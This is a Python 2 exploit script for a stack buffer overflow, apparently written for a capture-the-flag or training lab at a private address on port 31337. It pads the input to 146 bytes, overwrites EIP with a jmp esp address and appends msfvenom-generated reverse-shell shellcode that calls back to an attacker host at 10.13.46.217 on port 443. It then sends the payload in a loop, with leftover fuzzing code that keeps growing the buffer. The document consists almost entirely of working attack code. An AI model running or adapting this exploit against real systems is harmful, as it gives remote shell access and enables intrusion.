#!/usr/bin/python

import socket, time, sys


remoteip="10.10.166.176"
remoteport=31337
size=146
offset = "A" * size
#jmp esp 080414C3
eip = "\xc3\x14\x04\x08"

#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x0a\x0d" -v esp -f python


esp =  b"\x90" * 16
esp += b"\xd9\xc7\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbf\x76"
esp += b"\x31\x98\x15\x83\xea\xfc\x31\x7a\x13\x03\x0c\x22\x7a"
esp += b"\xe0\x0c\xac\xf8\x0b\xec\x2d\x9d\x82\x09\x1c\x9d\xf1"
esp += b"\x5a\x0f\x2d\x71\x0e\xbc\xc6\xd7\xba\x37\xaa\xff\xcd"
esp += b"\xf0\x01\x26\xe0\x01\x39\x1a\x63\x82\x40\x4f\x43\xbb"
esp += b"\x8a\x82\x82\xfc\xf7\x6f\xd6\x55\x73\xdd\xc6\xd2\xc9"
esp += b"\xde\x6d\xa8\xdc\x66\x92\x79\xde\x47\x05\xf1\xb9\x47"
esp += b"\xa4\xd6\xb1\xc1\xbe\x3b\xff\x98\x35\x8f\x8b\x1a\x9f"
esp += b"\xc1\x74\xb0\xde\xed\x86\xc8\x27\xc9\x78\xbf\x51\x29"
esp += b"\x04\xb8\xa6\x53\xd2\x4d\x3c\xf3\x91\xf6\x98\x05\x75"
esp += b"\x60\x6b\x09\x32\xe6\x33\x0e\xc5\x2b\x48\x2a\x4e\xca"
esp += b"\x9e\xba\x14\xe9\x3a\xe6\xcf\x90\x1b\x42\xa1\xad\x7b"
esp += b"\x2d\x1e\x08\xf0\xc0\x4b\x21\x5b\x8d\xb8\x08\x63\x4d"
esp += b"\xd7\x1b\x10\x7f\x78\xb0\xbe\x33\xf1\x1e\x39\x33\x28"
esp += b"\xe6\xd5\xca\xd3\x17\xfc\x08\x87\x47\x96\xb9\xa8\x03"
esp += b"\x66\x45\x7d\x83\x36\xe9\x2e\x64\xe6\x49\x9f\x0c\xec"
esp += b"\x45\xc0\x2d\x0f\x8c\x69\xc7\xea\x47\x9c\x15\xda\x4e"
esp += b"\xc8\x27\x22\x70\xb2\xa1\xc4\x18\xd4\xe7\x5f\xb5\x4d"
esp += b"\xa2\x2b\x24\x91\x78\x56\x66\x19\x8f\xa7\x29\xea\xfa"
esp += b"\xbb\xde\x1a\xb1\xe1\x49\x24\x6f\x8d\x16\xb7\xf4\x4d"
esp += b"\x50\xa4\xa2\x1a\x35\x1a\xbb\xce\xab\x05\x15\xec\x31"
esp += b"\xd3\x5e\xb4\xed\x20\x60\x35\x63\x1c\x46\x25\xbd\x9d"
esp += b"\xc2\x11\x11\xc8\x9c\xcf\xd7\xa2\x6e\xb9\x81\x19\x39"
esp += b"\x2d\x57\x52\xfa\x2b\x58\xbf\x8c\xd3\xe9\x16\xc9\xec"
esp += b"\xc6\xfe\xdd\x95\x3a\x9f\x22\x4c\xff\xaf\x68\xcc\x56"
esp += b"\x38\x35\x85\xea\x25\xc6\x70\x28\x50\x45\x70\xd1\xa7"
esp += b"\x55\xf1\xd4\xec\xd1\xea\xa4\x7d\xb4\x0c\x1a\x7d\x9d"

buffer = offset + eip + esp
while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

#    print s.recv(1024)
    s.send(buffer + '\r\n')
#    print s.recv(1024)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print "-------------------------"
